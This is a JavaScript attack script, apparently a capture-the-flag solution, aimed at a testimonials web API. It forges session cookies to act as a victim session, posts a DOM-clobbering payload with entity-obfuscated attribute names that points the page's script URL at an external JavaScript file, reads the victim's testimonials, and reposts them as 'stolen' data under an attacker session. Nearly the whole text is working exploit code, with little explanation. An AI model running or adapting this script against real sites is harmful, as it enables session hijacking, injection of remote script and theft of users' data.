(async function stealAndPostVictimData() {

    // ====================== 1. POST "you have been hacked" to Victim (1410) ======================
    document.cookie = "session=1410; path=/";
    await new Promise(r => setTimeout(r, 400));
    await fetch('/api/testimonials', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': '*/*'
        },
        credentials: 'include',
        body: JSON.stringify({ 
            content: "you have been hacked <a id=PixelAnalyticsConfig name=enabled href=true> <a id=PixelAnalyticsConfig name=scr&#105ptUrl href=https://ctffiles&#46vercel&#46app/alet&#46js>" 
        })
    })
    .then(r => console.log("Initial POST Status:", r.status))
    .catch(err => console.error("Initial POST Error:", err));

    // Small delay
    await new Promise(r => setTimeout(r, 800));

    // ====================== 2. FETCH All Victim Data (1410) ======================

    let victimTestimonials = [];

    try {
        const res = await fetch('/api/testimonials', {
            method: 'GET',
            credentials: 'include'
        });

        if (res.ok) {
            victimTestimonials = await res.json();
            console.log(`Fetched ${Array.isArray(victimTestimonials) ? victimTestimonials.length : 1} testimonial(s)`);
        }
    } catch (e) {
        console.error("Fetch failed", e);
    }

    // Format victim data
    let victimFormatted = "";

    if (Array.isArray(victimTestimonials) && victimTestimonials.length > 0) {
        victimFormatted = victimTestimonials.map((item, index) => {
            return `=== VICTIM TESTIMONIAL ${index + 1} ===\n` +
                   `UUID     : ${item.uuid || "N/A"}\n` +
                   `Content  : ${item.content || item}\n` +
                   `Timestamp: ${item.timestamp || "N/A"}\n` +
                   `Username : ${item.username || "N/A"}\n` +
                   `User Name: ${item.user_name || "N/A"}\n`;
        }).join("\n\n");
    } else if (victimTestimonials) {
        const item = victimTestimonials;
        victimFormatted = `=== VICTIM TESTIMONIAL ===\n` +
                         `UUID     : ${item.uuid || "N/A"}\n` +
                         `Content  : ${item.content || item}\n` +
                         `Timestamp: ${item.timestamp || "N/A"}\n` +
                         `Username : ${item.username || "N/A"}\n` +
                         `User Name: ${item.user_name || "N/A"}\n`;
    }

    const finalContent = `STOLEN TESTIMONIALS FROM VICTIM (1410)\n\n` + 
                        victimFormatted + 
                        `\n\n=== END OF VICTIM DATA ===`;

    // ====================== 3. POST to Attacker Session (1409) ======================
    document.cookie = "session=1409; path=/";
    await new Promise(r => setTimeout(r, 600));

    console.log("Posting stolen victim data to session=1409...");

    await fetch('/api/testimonials', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': '*/*'
        },
        credentials: 'include',
        body: JSON.stringify({ 
            content: finalContent 
        })
    })
    .then(r => r.text())
    .then(text => console.log("Successfully posted to 1409"))
    .catch(err => console.error("POST Error:", err));



})();
